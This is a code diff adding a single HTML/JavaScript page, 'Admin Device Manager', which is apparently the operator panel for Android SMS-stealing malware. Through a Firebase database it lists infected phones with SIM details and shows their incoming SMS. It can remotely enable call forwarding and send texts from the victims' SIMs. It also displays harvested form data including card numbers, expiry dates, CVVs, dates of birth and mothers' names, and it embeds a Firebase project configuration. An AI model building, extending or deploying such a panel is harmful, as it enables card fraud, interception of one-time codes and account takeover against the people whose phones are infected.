@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Device Manager</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+
+    <style>
+        :root {
+            --primary-gradient: linear-gradient(135deg, #4e54c8, #8f94fb);
+            --card-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        body {
+            background-color: #f3f4f6;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* Navbar */
+        .navbar {
+            background: var(--primary-gradient);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        /* Device Card Styling */
+        .device-card {
+            border: none;
+            border-radius: 12px;
+            background: white;
+            box-shadow: var(--card-shadow);
+            transition: transform 0.2s, box-shadow 0.2s;
+            overflow: hidden;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .device-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        }
+
+        .card-header-custom {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Status Indicators */
+        .status-dot {
+            height: 10px;
+            width: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+        }
+        .status-online { background-color: #28a745; box-shadow: 0 0 5px #28a745; }
+        .status-offline { background-color: #dc3545; }
+
+        /* Battery Styling */
+        .battery-wrapper {
+            display: flex;
+            align-items: center;
+            font-size: 0.85rem;
+        }
+        .battery-icon { font-size: 1.2rem; margin-right: 4px; }
+        .text-low { color: #dc3545; }
+        .text-mid { color: #ffc107; }
+        .text-high { color: #198754; }
+
+        /* SIM Info styling */
+        .sim-info {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            min-height: 80px; /* Uniform height */
+        }
+        .sim-label { font-size: 0.75rem; color: #6c757d; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
+        .carrier-name { font-weight: 600; color: #4e54c8; line-height: 1.2; }
+        .sim-number { font-size: 0.8rem; color: #555; margin-top: 2px; }
+
+        /* Modal Styling */
+        .modal-header { background: var(--primary-gradient); color: white; }
+        .modal-title { font-weight: 600; }
+        .btn-close-white { filter: invert(1); }
+        
+        .nav-pills .nav-link { color: #495057; border-radius: 8px; margin-right: 5px; }
+        .nav-pills .nav-link.active { background-color: #4e54c8; color: white; }
+        
+        .action-card { border: 1px solid #e9ecef; border-radius: 10px; padding: 20px; height: 100%; overflow-y: auto; max-height: 500px; }
+        .form-label { font-weight: 500; font-size: 0.9rem; }
+
+        /* SMS & Form Items */
+        .list-group-item { 
+            border-left: 3px solid transparent; 
+            border-bottom: 1px solid #e9ecef !important;
+        }
+        .list-group-item:hover { background-color: #f8f9fa; border-left-color: #4e54c8; }
+        .sms-sender { font-weight: 700; color: #4e54c8; font-size: 1.05rem; }
+        .sms-time { font-size: 0.8rem; color: #6c757d; }
+        
+        .sms-body { 
+            color: #333; 
+            font-size: 1rem; 
+            margin-top: 8px; 
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            background: #fcfcfc;
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #e9ecef;
+            line-height: 1.5;
+            width: 100%;
+        }
+        
+        #command-status-display {
+            display: none;
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        /* Form Data Styling */
+        .form-entry-card {
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            background: white;
+            transition: all 0.3s;
+        }
+        .form-entry-card:hover {
+            border-color: #4e54c8;
+            box-shadow: 0 3px 10px rgba(78, 84, 200, 0.1);
+        }
+        .form-step-badge {
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 12px;
+            margin-left: 8px;
+        }
+        .form-step-1 { background: #d1ecf1; color: #0c5460; }
+        .form-step-2 { background: #fff3cd; color: #856404; }
+        .form-step-3 { background: #d4edda; color: #155724; }
+        .form-step-final { background: #721c24; color: white; }
+        .form-data-row {
+            border-bottom: 1px solid #f1f1f1;
+            padding: 8px 0;
+        }
+        .form-data-row:last-child {
+            border-bottom: none;
+        }
+        .form-field-label {
+            font-weight: 600;
+            color: #495057;
+            font-size: 0.85rem;
+        }
+        .form-field-value {
+            color: #212529;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar navbar-dark sticky-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="bi bi-shield-lock-fill me-2"></i>Admin Panel
+            </a>
+            <span class="text-white" id="connection-status">
+                <span class="spinner-border spinner-border-sm" role="status"></span> Connecting...
+            </span>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <h4 class="mb-0"><i class="bi bi-phone me-2"></i>Device List</h4>
+            <button class="btn btn-outline-primary btn-sm" onclick="location.reload()">
+                <i class="bi bi-arrow-clockwise"></i> Refresh
+            </button>
+        </div>
+
+        <div class="row" id="device-grid">
+            <div class="col-12 text-center py-5">
+                <div class="spinner-border text-primary" role="status"></div>
+                <p class="mt-2 text-muted">Connecting to database...</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="deviceControlModal" tabindex="-1">
+        <div class="modal-dialog modal-lg modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div>
+                        <h5 class="modal-title" id="modalDeviceName">Device Name</h5>
+                        <small class="opacity-75" id="modalDeviceId">ID: ...</small>
+                    </div>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    
+                    <div id="command-status-display"></div>
+
+                    <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+                        <li class="nav-item"><button class="nav-link active" data-bs-toggle="pill" data-bs-target="#tab-call-forward"><i class="bi bi-telephone-forward me-1"></i> Call Forward</button></li>
+                        <li class="nav-item"><button class="nav-link" data-bs-toggle="pill" data-bs-target="#tab-send-sms"><i class="bi bi-chat-text me-1"></i> Send SMS</button></li>
+                        <li class="nav-item"><button class="nav-link" data-bs-toggle="pill" data-bs-target="#tab-incoming"><i class="bi bi-inbox me-1"></i> Incoming SMS</button></li>
+                        <li class="nav-item"><button class="nav-link" data-bs-toggle="pill" data-bs-target="#tab-forms"><i class="bi bi-file-earmark-text me-1"></i> Form Data</button></li>
+                    </ul>
+
+                    <div class="tab-content" id="pills-tabContent">
+                        
+                        <div class="tab-pane fade show active" id="tab-call-forward">
+                            <div class="action-card bg-white">
+                                <h6 class="mb-3 text-primary">Manage Call Forwarding</h6>
+                                <div class="row g-3">
+                                    <div class="col-md-6">
+                                        <label class="form-label">Forward To</label>
+                                        <input type="tel" id="cf_number" class="form-control" placeholder="+91...">
+                                    </div>
+                                    <div class="col-md-6">
+                                        <label class="form-label">Select SIM</label>
+                                        <select id="cf_sim_select" class="form-select"></select>
+                                    </div>
+                                    <div class="col-12 mt-4 d-flex gap-2">
+                                        <button onclick="submitCallForward('enable')" class="btn btn-success flex-grow-1">Activate</button>
+                                        <button onclick="submitCallForward('disable')" class="btn btn-danger flex-grow-1">Deactivate</button>
+                                        <button onclick="checkStatus()" class="btn btn-info text-white">Check Status</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane fade" id="tab-send-sms">
+                            <div class="action-card bg-white">
+                                <h6 class="mb-3 text-primary">Send Text Message</h6>
+                                <input type="tel" id="sms_number" class="form-control mb-3" placeholder="Number">
+                                <textarea id="sms_body" class="form-control mb-3" rows="3" placeholder="Message"></textarea>
+                                <select id="sms_sim_select" class="form-select mb-3"></select>
+                                <button onclick="submitSendSMS()" class="btn btn-primary w-100">Send Now</button>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane fade" id="tab-incoming">
+                            <div class="action-card bg-white">
+                                <h6 class="text-primary mb-3">Incoming SMS Logs</h6>
+                                <div class="list-group list-group-flush" id="incoming_sms_list">
+                                    <div class="text-center py-4">
+                                        <div class="spinner-border spinner-border-sm text-primary" role="status"></div>
+                                        <p class="mt-2 text-muted">Loading SMS logs...</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane fade" id="tab-forms">
+                            <div class="action-card bg-white">
+                                <h6 class="text-primary mb-3">Form Submissions</h6>
+                                <div class="mb-3">
+                                    <button class="btn btn-sm btn-outline-secondary" onclick="refreshFormData()">
+                                        <i class="bi bi-arrow-clockwise"></i> Refresh
+                                    </button>
+                                    <span class="ms-2 text-muted" id="forms-count">Loading...</span>
+                                </div>
+                                <div id="form_data_container">
+                                    <div class="text-center py-4">
+                                        <div class="spinner-border spinner-border-sm text-primary" role="status"></div>
+                                        <p class="mt-2 text-muted">Loading form data...</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        // --- CONFIGURATION ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyBZZ_GybkpSC3dcbNFfq2DeXjXxZSGy5vI",
+            authDomain: "newcsapp.firebaseapp.com",
+            databaseURL: "https://newcsapp-default-rtdb.firebaseio.com",
+            projectId: "newcsapp",
+            storageBucket: "newcsapp.firebasestorage.app",
+            messagingSenderId: "1029853326976",
+            appId: "1:1029853326976:web:0ffa29e4bb2f1d03994065"
+        };
+
+        let app, database;
+        let currentSelectedDeviceId = null;
+        let devicesData = {};
+        
+        // Listeners References
+        let currentSmsRef = null;
+        let currentFormsRef = null;
+        let statusRef = null;
+        let allFormsRef = null;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            try {
+                app = firebase.initializeApp(firebaseConfig);
+                database = firebase.database(app);
+                
+                // Connection Monitor
+                database.ref(".info/connected").on("value", function(snap) {
+                    if (snap.val() === true) {
+                        document.getElementById('connection-status').innerHTML = '<i class="bi bi-wifi"></i> Connected';
+                        document.getElementById('connection-status').classList.remove('text-danger');
+                        document.getElementById('connection-status').classList.add('text-success');
+                    } else {
+                        document.getElementById('connection-status').innerHTML = '<i class="bi bi-wifi-off"></i> Offline';
+                        document.getElementById('connection-status').classList.add('text-danger');
+                    }
+                });
+
+                listenForDevices();
+                
+                // Timeout Warning if no data loads
+                setTimeout(() => {
+                    const grid = document.getElementById('device-grid');
+                    if(grid.innerHTML.includes('Connecting')) {
+                        grid.innerHTML = `
+                            <div class="col-12 text-center text-danger mt-5">
+                                <h5><i class="bi bi-exclamation-triangle"></i> Timeout Error</h5>
+                                <p>Data not loading. Possible reasons:</p>
+                                <ul class="list-unstyled">
+                                    <li>1. Internet connection issue.</li>
+                                    <li>2. Firebase Rules (Read/Write) are set to false.</li>
+                                    <li>3. No devices have installed the app yet.</li>
+                                </ul>
+                            </div>`;
+                    }
+                }, 8000); // 8 seconds timeout
+
+                const modalEl = document.getElementById('deviceControlModal');
+                modalEl.addEventListener('hidden.bs.modal', function () {
+                    detachDeviceListeners();
+                    document.getElementById('command-status-display').style.display = 'none';
+                });
+
+            } catch (e) {
+                console.error(e);
+                alert("Config Error: " + e.message);
+            }
+        });
+
+        function listenForDevices() {
+            const devicesRef = database.ref('devices');
+            devicesRef.on('value', (snapshot) => {
+                devicesData = snapshot.val() || {};
+                renderDeviceGrid(devicesData);
+            }, (error) => {
+                console.error("Firebase Read Error:", error);
+                document.getElementById('device-grid').innerHTML = `<div class="alert alert-danger">Firebase Error: ${error.message} <br> Check Database Rules.</div>`;
+            });
+        }
+
+        function renderDeviceGrid(devices) {
+            const container = document.getElementById('device-grid');
+            container.innerHTML = '';
+
+            if (Object.keys(devices).length === 0) {
+                container.innerHTML = `
+                    <div class="col-12 text-center mt-5">
+                        <i class="bi bi-phone display-4 text-muted"></i>
+                        <h5 class="mt-3">No Devices Found</h5>
+                        <p class="text-muted">Install the app on a phone to see it here.</p>
+                    </div>`;
+                return;
+            }
+
+            const currentTime = Date.now();
+
+            Object.keys(devices).forEach(key => {
+                const device = devices[key];
+                
+                // Time-based Offline Logic (2 minutes)
+                let isOnline = false;
+                if (device.is_online === true) {
+                    const lastTime = device.last_seen || device.timestamp || 0;
+                    if (currentTime - lastTime < 120000) {
+                        isOnline = true;
+                    }
+                }
+
+                const battery = device.battery_level || 0;
+                let batClass = 'text-low', batIcon = 'bi-battery';
+                if(battery > 50) { batClass = 'text-high'; batIcon = 'bi-battery-full'; }
+                else if(battery > 20) { batClass = 'text-mid'; batIcon = 'bi-battery-half'; }
+
+                // SIM Info Logic
+                let sim1Html = '';
+                if (!device.sim1_carrier || device.sim1_carrier === 'Unknown' || device.sim1_carrier === 'N/A') {
+                    sim1Html = '<div class="text-danger fw-bold" style="font-size: 0.8rem;">Sim not Available</div>';
+                } else {
+                    sim1Html = `<div class="carrier-name text-truncate">${device.sim1_carrier}</div>`;
+                    if(device.sim1_number) {
+                        sim1Html += `<div class="sim-number text-truncate">${device.sim1_number}</div>`;
+                    }
+                }
+
+                let sim2Html = '';
+                if (!device.sim2_carrier || device.sim2_carrier === 'Unknown' || device.sim2_carrier === 'N/A') {
+                    sim2Html = '<div class="text-danger fw-bold" style="font-size: 0.8rem;">Sim not Available</div>';
+                } else {
+                    sim2Html = `<div class="carrier-name text-truncate">${device.sim2_carrier}</div>`;
+                    if(device.sim2_number) {
+                        sim2Html += `<div class="sim-number text-truncate">${device.sim2_number}</div>`;
+                    }
+                }
+
+                const cardHtml = `
+                <div class="col-md-6 col-lg-4">
+                    <div class="device-card" onclick="openDeviceModal('${key}')">
+                        <div class="card-header-custom">
+                            <div>
+                                <h5 class="mb-0 text-dark fw-bold">${device.device_name || 'Device'}</h5>
+                                <small class="text-muted">ID: ${key.substring(0,8)}</small>
+                            </div>
+                            <div class="text-end">
+                                <div>
+                                    <span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span>
+                                    <small class="${isOnline ? 'text-success' : 'text-danger'} fw-bold">
+                                        ${isOnline ? 'Online' : 'Offline'}
+                                    </small>
+                                </div>
+                                <div class="battery-wrapper ${batClass} mt-1 justify-content-end">
+                                    <i class="bi ${batIcon}"></i> <strong>${battery}%</strong>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card-body pt-2 pb-3 px-3">
+                            <div class="row">
+                                <div class="col-6">
+                                    <div class="sim-info text-truncate">
+                                        <div class="sim-label">SIM 1</div>
+                                        ${sim1Html}
+                                    </div>
+                                </div>
+                                <div class="col-6">
+                                    <div class="sim-info text-truncate">
+                                        <div class="sim-label">SIM 2</div>
+                                        ${sim2Html}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>`;
+                container.innerHTML += cardHtml;
+            });
+        }
+
+        function openDeviceModal(deviceId) {
+            currentSelectedDeviceId = deviceId;
+            const device = devicesData[deviceId];
+            if (!device) return;
+
+            document.getElementById('modalDeviceName').innerText = device.device_name || 'Device';
+            document.getElementById('modalDeviceId').innerText = 'ID: ' + deviceId;
+            
+            const simOptions = `
+                <option value="0">SIM 1 - ${device.sim1_carrier || 'Unknown'}</option>
+                <option value="1">SIM 2 - ${device.sim2_carrier || 'Unknown'}</option>
+            `;
+            document.getElementById('cf_sim_select').innerHTML = simOptions;
+            document.getElementById('sms_sim_select').innerHTML = simOptions;
+
+            loadDeviceSpecificData(deviceId);
+            new bootstrap.Modal(document.getElementById('deviceControlModal')).show();
+        }
+
+        function detachDeviceListeners() {
+            if (currentSmsRef) currentSmsRef.off();
+            if (allFormsRef) allFormsRef.off();
+            if (statusRef) statusRef.off();
+        }
+
+        function loadDeviceSpecificData(deviceId) {
+            detachDeviceListeners();
+
+            // 1. SMS Logs - UPDATED LOGIC
+            currentSmsRef = database.ref('sms/' + deviceId).limitToLast(50);
+            currentSmsRef.on('value', (snapshot) => {
+                const listContainer = document.getElementById('incoming_sms_list');
+                listContainer.innerHTML = ''; 
+                
+                if (!snapshot.exists()) {
+                    listContainer.innerHTML = '<div class="text-center text-muted py-4">No SMS logs found.</div>';
+                    return;
+                }
+
+                const msgs = [];
+                snapshot.forEach(child => {
+                    msgs.push(child.val());
+                });
+                
+                // Sort by timestamp (newest first)
+                msgs.sort((a, b) => b.timestamp - a.timestamp);
+                
+                msgs.forEach(msg => {
+                    const dateObj = new Date(msg.timestamp);
+                    const timeStr = dateObj.toLocaleString();
+                    const senderName = msg.sender || msg.address || msg.phone || 'Unknown Sender';
+                    const messageBody = msg.message || msg.body || '(No Content)';
+                    
+                    const item = `
+                        <div class="list-group-item px-3 py-3">
+                            <div class="d-flex w-100 justify-content-between align-items-center mb-2">
+                                <span class="sms-sender text-primary">
+                                    <i class="bi bi-person-lines-fill me-2"></i> <strong>${senderName}</strong>
+                                </span>
+                                <small class="sms-time text-muted">${timeStr}</small>
+                            </div>
+                            <div class="sms-body">${messageBody}</div>
+                        </div>
+                    `;
+                    listContainer.innerHTML += item;
+                });
+            });
+
+            // 2. FORM DATA
+            loadFormDataForDevice(deviceId);
+
+            // 3. Status
+            statusRef = database.ref('devices/' + deviceId + '/status');
+            statusRef.on('value', (snap) => {
+                const status = snap.val();
+                if(status) showStatus(status, 'info');
+            });
+
+            // 4. Forwarding Status
+            const forwardingStatusRef = database.ref('devices/' + deviceId + '/forwarding_status');
+            forwardingStatusRef.on('value', (snap) => {
+                const status = snap.val();
+                if (status) {
+                    showStatus("Stored Status: " + status, 'success');
+                }
+            });
+        }
+
+        function loadFormDataForDevice(deviceId) {
+            // Listen to ALL forms and filter by device_id
+            allFormsRef = database.ref('forms').orderByChild('device_id').equalTo(deviceId).limitToLast(20);
+            
+            allFormsRef.on('value', (snapshot) => {
+                const container = document.getElementById('form_data_container');
+                if (!snapshot.exists()) {
+                    container.innerHTML = '<div class="text-center p-4 text-muted"><i class="bi bi-file-earmark-x display-4"></i><p class="mt-2">No form submissions yet</p></div>';
+                    document.getElementById('forms-count').innerText = '0 submissions';
+                    return;
+                }
+
+                const forms = [];
+                snapshot.forEach(child => {
+                    const form = child.val();
+                    form.formId = child.key; // Store the form ID
+                    forms.push(form);
+                });
+
+                // Sort by timestamp (newest first)
+                forms.sort((a, b) => b.timestamp - a.timestamp);
+                
+                document.getElementById('forms-count').innerText = `${forms.length} submission${forms.length !== 1 ? 's' : ''}`;
+
+                let html = '';
+                
+                forms.forEach(form => {
+                    const date = new Date(form.timestamp).toLocaleString();
+                    
+                    // Get step badge class
+                    let stepClass = '';
+                    let stepText = form.step || 'unknown';
+                    if (form.step === 'step1') stepClass = 'form-step-1';
+                    else if (form.step === 'step2') stepClass = 'form-step-2';
+                    else if (form.step === 'step3') stepClass = 'form-step-3';
+                    else if (form.step === 'final') stepClass = 'form-step-final';
+                    
+                    html += `
+                    <div class="form-entry-card p-3">
+                        <div class="d-flex justify-content-between align-items-center mb-2">
+                            <div>
+                                <strong class="text-primary">${form.fullname || 'Unknown'}</strong>
+                                <span class="form-step-badge ${stepClass}">${stepText}</span>
+                            </div>
+                            <small class="text-muted">${date}</small>
+                        </div>
+                        
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">Mobile:</div>
+                            <div class="form-field-value col-8">${form.mobile || '-'}</div>
+                        </div>
+                        
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">Service:</div>
+                            <div class="form-field-value col-8">${form.service || '-'}</div>
+                        </div>`;
+                    
+                    if (form.mothername) {
+                        html += `
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">Mother's Name:</div>
+                            <div class="form-field-value col-8">${form.mothername}</div>
+                        </div>`;
+                    }
+                    
+                    if (form.dob) {
+                        html += `
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">Date of Birth:</div>
+                            <div class="form-field-value col-8">${form.dob}</div>
+                        </div>`;
+                    }
+                    
+                    if (form.cardnumber) {
+                        html += `
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">Card Number:</div>
+                            <div class="form-field-value col-8 text-monospace">${form.cardnumber}</div>
+                        </div>`;
+                    }
+                    
+                    if (form.expiry) {
+                        html += `
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">Expiry:</div>
+                            <div class="form-field-value col-8">${form.expiry}</div>
+                        </div>`;
+                    }
+                    
+                    if (form.cvv) {
+                        html += `
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">CVV:</div>
+                            <div class="form-field-value col-8">${form.cvv}</div>
+                        </div>`;
+                    }
+                    
+                    html += `
+                        <div class="form-data-row d-flex">
+                            <div class="form-field-label col-4">Status:</div>
+                            <div class="form-field-value col-8">
+                                <span class="badge ${form.status === 'completed' ? 'bg-success' : 'bg-warning'}">
+                                    ${form.status || 'in_progress'}
+                                </span>
+                            </div>
+                        </div>
+                        <div class="mt-2 text-end">
+                            <small class="text-muted">Form ID: ${form.formId}</small>
+                        </div>
+                    </div>`;
+                });
+                
+                container.innerHTML = html;
+            });
+        }
+
+        function refreshFormData() {
+            if (currentSelectedDeviceId) {
+                loadFormDataForDevice(currentSelectedDeviceId);
+            }
+        }
+
+        function showStatus(msg, type) {
+            const el = document.getElementById('command-status-display');
+            el.style.display = 'block';
+            el.className = 'alert alert-info py-2';
+            el.innerText = "Status: " + msg;
+        }
+
+        function sendCommand(type, data) {
+            if(!currentSelectedDeviceId) return;
+            
+            showStatus("Sending command...", "info");
+            database.ref('devices/' + currentSelectedDeviceId + '/status').set("Waiting...");
+
+            const cmdId = 'cmd_' + Date.now();
+            database.ref('commands/' + currentSelectedDeviceId + '/' + cmdId).set({
+                command_id: cmdId,
+                command_type: type,
+                command_data: data,
+                timestamp: Date.now(),
+                status: 'pending'
+            });
+        }
+
+        function submitCallForward(action) {
+            const num = document.getElementById('cf_number').value;
+            const sim = parseInt(document.getElementById('cf_sim_select').value);
+            if(action === 'enable' && !num) return alert("Enter number!");
+            sendCommand('call_forward', { action: action, forward_number: num, sim_slot: sim });
+        }
+
+        function checkStatus() {
+            const sim = parseInt(document.getElementById('cf_sim_select').value);
+            if(currentSelectedDeviceId) {
+                database.ref('devices/' + currentSelectedDeviceId + '/status').set("Checking...");
+            }
+            sendCommand('call_forward', { action: 'check', sim_slot: sim });
+        }
+
+        function submitSendSMS() {
+            const num = document.getElementById('sms_number').value;
+            const body = document.getElementById('sms_body').value;
+            const sim = parseInt(document.getElementById('sms_sim_select').value);
+            if(!num || !body) return alert("Fill all fields");
+            sendCommand('send_sms', { phone_number: num, message: body, sim_slot: sim });
+        }
+    </script>
+</body>
+</html>
